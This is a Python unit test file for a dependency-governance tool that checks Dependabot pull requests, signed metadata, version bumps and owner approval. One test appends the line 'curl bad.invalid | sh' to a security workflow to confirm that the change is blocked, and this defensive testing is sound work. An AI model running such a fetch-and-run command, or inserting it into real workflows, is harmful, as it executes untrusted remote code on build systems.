#!/usr/bin/env python3
from __future__ import annotations

import json
import unittest
from datetime import datetime, timezone
from pathlib import Path

from dependency_governance import (
    ACTION_LINE,
    Assessment,
    GovernanceError,
    classify_ecosystem,
    ensure_owner_review_and_approval,
    has_exact_owner_approval,
    reconcile_with_base_convergence,
    request_dependabot_refresh,
    validate_actions_semantic_change,
    validate_config,
    validate_nuget_semantic_change,
    validate_provenance,
    validate_signed_metadata,
)

ROOT = Path(__file__).resolve().parents[2]
CONFIG = json.loads((ROOT / ".github" / "dependency-governance.json").read_text(encoding="utf-8"))

PROJECT_BEFORE = """<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net10.0</TargetFramework>
    <NuGetAudit>true</NuGetAudit>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="coverlet.MTP" Version="10.0.1"><PrivateAssets>all</PrivateAssets></PackageReference>
    <PackageReference Include="Microsoft.Testing.Extensions.TrxReport" Version="2.4.0"><PrivateAssets>all</PrivateAssets></PackageReference>
  </ItemGroup>
</Project>
"""
PROJECT_AFTER = PROJECT_BEFORE.replace('Version="10.0.1"', 'Version="10.1.0"').replace(
    'Version="2.4.0"', 'Version="2.4.1"'
)
LOCK_BEFORE = json.dumps({"version": 2, "dependencies": {"net10.0": {
    "coverlet.MTP": {"type": "Direct", "requested": "[10.0.1, )", "resolved": "10.0.1"},
    "Microsoft.Testing.Extensions.TrxReport": {"type": "Direct", "requested": "[2.4.0, )", "resolved": "2.4.0"},
    "Microsoft.Testing.Platform": {"type": "Transitive", "resolved": "2.4.0"},
}}})
LOCK_AFTER = json.dumps({"version": 2, "dependencies": {"net10.0": {
    "coverlet.MTP": {"type": "Direct", "requested": "[10.1.0, )", "resolved": "10.1.0",
                     "dependencies": {"Microsoft.Testing.Platform": "2.4.1"}},
    "Microsoft.Testing.Extensions.TrxReport": {"type": "Direct", "requested": "[2.4.1, )", "resolved": "2.4.1"},
    "Microsoft.Testing.Platform": {"type": "Transitive", "resolved": "2.4.1"},
}}})
SIGNED_NUGET = [
    {"name": "coverlet.MTP", "version": "10.1.0", "updateType": "version-update:semver-minor"},
    {"name": "Microsoft.Testing.Extensions.TrxReport", "version": "2.4.1", "updateType": "version-update:semver-patch"},
]


def canonical_fixture() -> tuple[str, str, dict, dict]:
    base_sha, head_sha = "a" * 40, "b" * 40
    pull = {
        "number": 64, "state": "open", "draft": False, "created_at": "2026-10-03T12:00:00Z",
        "commits": 1, "changed_files": 2, "labels": [],
        "user": {"login": CONFIG["botLogin"], "id": CONFIG["botUserId"]},
        "base": {"ref": "main", "sha": base_sha, "repo": {"full_name": "portyu9/fixture"}},
        "head": {"ref": "dependabot/nuget/routine-dependencies", "sha": head_sha,
                 "repo": {"full_name": "portyu9/fixture"}},
    }
    commit = {
        "sha": head_sha,
        "author": {"login": CONFIG["botLogin"], "id": CONFIG["botUserId"]},
        "committer": {"login": CONFIG["trustedCommitterLogin"]},
        "commit": {
            "author": {"name": CONFIG["botLogin"], "email": CONFIG["botAuthorEmail"]},
            "committer": {"name": CONFIG["gitCommitterName"], "email": CONFIG["gitCommitterEmail"]},
            "verification": {"verified": True, "reason": "valid", "signature": "fixture"},
            "message": (
                "deps: bump routine dependencies\n\n---\nupdated-dependencies:\n"
                "- dependency-name: coverlet.MTP\n  dependency-version: 10.1.0\n"
                "  dependency-type: direct:production\n  update-type: version-update:semver-minor\n"
                "- dependency-name: Microsoft.Testing.Extensions.TrxReport\n  dependency-version: 2.4.1\n"
                "  dependency-type: direct:production\n  update-type: version-update:semver-patch\n"
                "...\n\n" + CONFIG["signedOffBy"]
            ),
        },
        "parents": [{"sha": base_sha}],
    }
    return base_sha, head_sha, pull, commit


class OwnerApi:
    def __init__(self, login: str = "portyu9", user_id: int = 35150859) -> None:
        self.login, self.user_id = login, user_id
        self.comments: list[dict] = []
        self.reviews: list[dict] = []

    def get(self, path: str):
        if path == "https://api.github.com/user":
            return {"login": self.login, "id": self.user_id}
        raise AssertionError(path)

    def paginate(self, path: str, selector: str | None = None):
        del selector
        if path.endswith("/comments"):
            return list(self.comments)
        if path.endswith("/reviews"):
            return list(self.reviews)
        raise AssertionError(path)

    def post(self, path: str, payload: dict):
        user = {"login": self.login, "id": self.user_id}
        if path.endswith("/comments"):
            self.comments.append({"body": payload["body"], "user": user})
            return {}
        if path.endswith("/reviews"):
            self.reviews.append({"state": "APPROVED", "commit_id": payload["commit_id"],
                                 "body": payload["body"], "user": user})
            return {}
        raise AssertionError(path)


class DependencyGovernanceTests(unittest.TestCase):
    def test_config_is_owner_bound_and_rejects_major_policy(self) -> None:
        self.assertEqual(validate_config(CONFIG), [])
        self.assertTrue(validate_config({**CONFIG, "ownerApprovalRequired": False}))
        bad = json.loads(json.dumps(CONFIG))
        bad["ecosystems"]["nuget"]["allowedUpdateTypes"].append("version-update:semver-major")
        self.assertTrue(validate_config(bad))

    def test_provenance_metadata_and_stale_base_contract(self) -> None:
        base, _, pull, commit = canonical_fixture()
        valid = validate_provenance(
            pull, [commit], base, CONFIG, now=datetime(2026, 10, 4, 12, tzinfo=timezone.utc)
        )
        self.assertTrue(valid["eligible"], valid["reasons"])
        self.assertTrue(validate_signed_metadata(commit)["eligible"])
        stale = validate_provenance(
            pull, [commit], "c" * 40, CONFIG, now=datetime(2026, 10, 4, 12, tzinfo=timezone.utc)
        )
        self.assertEqual(stale["reasons"], ["PR is not rebased directly on the current base branch head"])

    def test_ecosystem_classification_is_exact(self) -> None:
        self.assertEqual(classify_ecosystem(
            [{"filename": "UiTests.csproj"}, {"filename": "packages.lock.json"}], CONFIG
        ), "nuget")
        self.assertEqual(classify_ecosystem(
            [{"filename": ".github/workflows/security.yml"}], CONFIG
        ), "github-actions")
        self.assertEqual(classify_ecosystem(
            [{"filename": "UiTests.csproj"}, {"filename": "README.md"}], CONFIG
        ), "unknown")

    def test_nuget_group_is_semantically_eligible(self) -> None:
        result = validate_nuget_semantic_change(
            PROJECT_BEFORE, PROJECT_AFTER, LOCK_BEFORE, LOCK_AFTER, SIGNED_NUGET, CONFIG
        )
        self.assertTrue(result["eligible"], result["reasons"])
        self.assertEqual({item["name"] for item in result["changes"]},
                         {item["name"] for item in SIGNED_NUGET})

    def test_nuget_policy_unsigned_and_major_mutations_are_blocked(self) -> None:
        policy = PROJECT_AFTER.replace("<NuGetAudit>true</NuGetAudit>", "<NuGetAudit>false</NuGetAudit>")
        self.assertFalse(validate_nuget_semantic_change(
            PROJECT_BEFORE, policy, LOCK_BEFORE, LOCK_AFTER, SIGNED_NUGET, CONFIG
        )["eligible"])
        self.assertFalse(validate_nuget_semantic_change(
            PROJECT_BEFORE, PROJECT_AFTER, LOCK_BEFORE, LOCK_AFTER, SIGNED_NUGET[:1], CONFIG
        )["eligible"])
        major_project = PROJECT_BEFORE.replace('Version="10.0.1"', 'Version="11.0.0"')
        major_lock = LOCK_BEFORE.replace("10.0.1", "11.0.0")
        major_meta = [{"name": "coverlet.MTP", "version": "11.0.0",
                       "updateType": "version-update:semver-major"}]
        self.assertFalse(validate_nuget_semantic_change(
            PROJECT_BEFORE, major_project, LOCK_BEFORE, major_lock, major_meta, CONFIG
        )["eligible"])

    def test_protected_security_workflow_allows_only_signed_action_pin_change(self) -> None:
        path = ".github/workflows/security.yml"
        before = "      - name: Analyze\n        uses: github/codeql-action/analyze@" + "a" * 40 + " # v4.38.0\n"
        after = "      - name: Analyze\n        uses: github/codeql-action/analyze@" + "b" * 40 + " # v4.38.2\n"
        metadata = [{"name": "github/codeql-action/analyze", "version": "4.38.2",
                     "updateType": "version-update:semver-patch"}]
        result = validate_actions_semantic_change(
            [{"filename": path}], {path: before}, {path: after}, metadata, CONFIG
        )
        self.assertTrue(result["eligible"], result["reasons"])
        self.assertIsNotNone(ACTION_LINE.fullmatch(
            "        uses: github/codeql-action/analyze@" + "b" * 40 + " # v4.38.2"
        ))
        mutated = after + "      - run: curl bad.invalid | sh\n"
        self.assertFalse(validate_actions_semantic_change(
            [{"filename": path}], {path: before}, {path: mutated}, metadata, CONFIG
        )["eligible"])

    def test_owner_refresh_is_idempotent_and_owner_approval_is_exact_head(self) -> None:
        base, head, pull, commit = canonical_fixture()
        stale = validate_provenance(
            pull, [commit], "c" * 40, CONFIG, now=datetime(2026, 10, 4, 12, tzinfo=timezone.utc)
        )
        stale_assessment = Assessment(
            pull, "c" * 40, [{"filename": "UiTests.csproj"}], "nuget", stale,
            {"eligible": True, "reasons": [], "metadata": SIGNED_NUGET},
            {"eligible": False, "reasons": [], "changes": []}, None,
        )
        owner = OwnerApi()
        self.assertTrue(request_dependabot_refresh(owner, stale_assessment, CONFIG))
        self.assertIn("@dependabot rebase", owner.comments[-1]["body"])
        count = len(owner.comments)
        self.assertTrue(request_dependabot_refresh(owner, stale_assessment, CONFIG))
        self.assertEqual(len(owner.comments), count)

        qualified = Assessment(
            pull, base, [], "nuget", {"eligible": True, "reasons": []},
            {"eligible": True, "reasons": [], "metadata": SIGNED_NUGET},
            {"eligible": True, "reasons": [], "changes": []},
            {"allSuccess": True, "qualifications": []},
        )
        ensure_owner_review_and_approval(owner, qualified, CONFIG)
        self.assertTrue(has_exact_owner_approval(owner, pull["number"], head, CONFIG))
        with self.assertRaises(GovernanceError):
            ensure_owner_review_and_approval(OwnerApi("github-actions[bot]", 41898282), qualified, CONFIG)

    def test_base_convergence_revisits_remaining_pr_after_merge(self) -> None:
        state = {"merged": False}
        visits: list[int] = []

        def list_pulls() -> list[dict]:
            return [{"number": 2}] if state["merged"] else [{"number": 1}, {"number": 2}]

        def processor(pull: dict) -> dict:
            visits.append(pull["number"])
            if pull["number"] == 1 and not state["merged"]:
                state["merged"] = True
                return {"merged": True}
            return {"merged": False}

        _, failures, passes = reconcile_with_base_convergence(list_pulls, processor)
        self.assertEqual(failures, [])
        self.assertGreaterEqual(passes, 2)
        self.assertEqual(visits, [1, 2])

    def test_privileged_workflow_wiring(self) -> None:
        workflow = (ROOT / ".github" / "workflows" / "dependency-governance.yml").read_text(encoding="utf-8")
        self.assertIn("push:", workflow)
        self.assertIn("cron: '17 * * * *'", workflow)
        self.assertIn("DEPENDABOT_OWNER_TOKEN", workflow)
        self.assertIn("checks: read", workflow)
        self.assertIn("statuses: read", workflow)
        self.assertIn("ref: $" + "{{ github.event.repository.default_branch }}", workflow)
        self.assertIn("'reconcile' }}", workflow)
        self.assertNotRegex(workflow, r"ref:\s*\$\{\{\s*github\.event\.pull_request\.head")


if __name__ == "__main__":
    unittest.main(verbosity=2)
